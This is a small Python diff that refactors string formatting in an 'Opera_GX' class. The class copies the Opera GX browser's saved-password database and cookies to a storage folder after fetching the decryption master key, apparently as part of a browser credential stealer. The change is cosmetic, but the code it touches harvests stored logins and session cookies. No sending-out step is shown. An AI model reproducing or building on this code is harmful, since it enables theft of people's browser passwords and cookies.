@@ -64,9 +64,9 @@ class Opera_GX:
             if (path.exists(self.passwords_path)) is True:
 
                 master_key = self.__get_key()
-                shutil.copyfile(self.passwords_path, self.storage_path + "Opera_GX.db")
+                shutil.copyfile(self.passwords_path, f"{self.storage_path}Opera_GX.db")
 
-                with connect(self.storage_path + "Opera_GX.db") as connection:
+                with connect(f"{self.storage_path}Opera_GX.db") as connection:
 
                     cursor = connection.cursor()
 
@@ -80,7 +80,7 @@ class Opera_GX:
 
                 shutil.copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}Opera GX Cookies", follow_symlinks=True)
 
-            remove(self.storage_path + "Opera_GX.db")
+            remove(f"{self.storage_path}Opera_GX.db")
 
         except Exception as e:
             print(repr(e))
